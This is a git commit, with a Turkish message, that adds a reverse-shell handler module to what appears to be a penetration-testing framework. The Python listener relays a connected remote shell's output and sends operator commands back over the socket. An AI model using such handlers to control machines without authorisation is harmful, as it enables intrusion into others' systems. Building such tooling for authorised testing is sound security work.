7045e2c7c72619b057c67996931d8170fc203719
Mahmut Paşa <mahcoder01@proton.me>
2026-01-31 16:26:24 +0300

    linux bash reverse tcp handler/dinleyici oluşturuldu

---
+++ modules/payloads/linux/bash_reverse_tcp/handler.py
@@ -0,0 +1,37 @@
+from core.handler import BaseHandler
+import threading
+import socket
+import sys
+import select
+from rich import print
+
+class Handler(BaseHandler):
+    """
+    Standart Reverse Shell Handler (Netcat clone).
+    """
+    def handle_connection(self, client_sock):
+        print("[*] Shell oturumu başlatılıyor...")
+        print("-" * 50)
+        
+        try:
+            while True:
+                rlist, _, _ = select.select([client_sock, sys.stdin], [], [])
+                
+                for r in rlist:
+                    if r == client_sock:
+                        data = client_sock.recv(4096)
+                        if not data:
+                            print("\n[!] Bağlantı karşı taraftan kapatıldı.")
+                            return
+                        sys.stdout.buffer.write(data)
+                        sys.stdout.flush()
+                        
+                    elif r == sys.stdin:
+                        msg = sys.stdin.readline()
+                        if not msg: break
+                        client_sock.sendall(msg.encode())
+                        
+        except KeyboardInterrupt:
+            print("\n[*] Shell oturumu sonlandırılıyor...")
+        except Exception as e:
+            print(f"[!] Hata: {e}")
